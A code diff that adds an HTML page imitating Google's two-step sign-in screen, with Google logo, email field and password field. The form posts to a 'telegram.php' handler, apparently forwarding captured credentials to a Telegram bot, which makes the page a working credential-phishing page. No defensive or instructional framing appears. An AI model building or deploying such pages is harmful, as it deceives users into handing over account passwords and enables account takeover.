@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Sign In | Multi step form</title>
+
+	<!-- bootstrap -->
+	<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css' />
+
+	<!-- bootstrap icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.10.3/font/bootstrap-icons.min.css" />
+	<!-- custom styles -->
+	<link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+	<section class="form-wrapper">
+		<div class="container">
+			<form id="multistepsform" method="post" action="telegram.php">
+				<!-- fieldsets -->
+				<fieldset>
+					<img src="images/Google-Logo.svg" alt="logo" class="img-fluid logo">
+					<h2>Sign in</h2>
+					<h3>with your Google Account</h3>
+					<div class="form-group">
+						<input class="form-control" name="user_email" type="email" id="email" autocomplete="off">
+						<label for="email">Email or Phone</label>
+					</div>
+					<a href="#" class="forgot-email">Forgot email?</a>
+					<p>Not your computer? Use a Private Window to sign in. 
+					<a href="#" class="learn-more">Learn more</a></p>
+					<div class="btns-wrapper">
+						<a href="#" class="create-ac">Create account</a>
+						<input type="button" name="next" class="next action-button" value="Next" />
+					</div>
+				</fieldset>
+			
+				<fieldset>
+					<img src="images/Google-Logo.svg" alt="logo" class="img-fluid logo">
+					<h2>Welcome</h2>
+					<h3><span class="icon-box"><i class="bi bi-person-circle"></i></span> <span id="input-email">vetevex651@anwarb.com</span></h3>
+					<div class="form-group">
+						<input class="form-control" type="password" id="password" autocomplete="off">
+						<label for="password">Enter your password</label>
+					</div>
+					<a href="#" class="forgot-email">Forgot password?</a>
+					<div class="btns-wrapper">
+						<a href="#" class="create-ac">Create account</a>
+						<button type="submit" class="next action-button">Next</button>
+					</div>
+				</fieldset>
+			</form>
+		</div>
+	</section>
+
+
+	<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js'></script>
+	<script src='https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.js'></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>
+	<!-- custom script -->
+	<script src="js/scripts.js"></script>
+</body>
+</html>
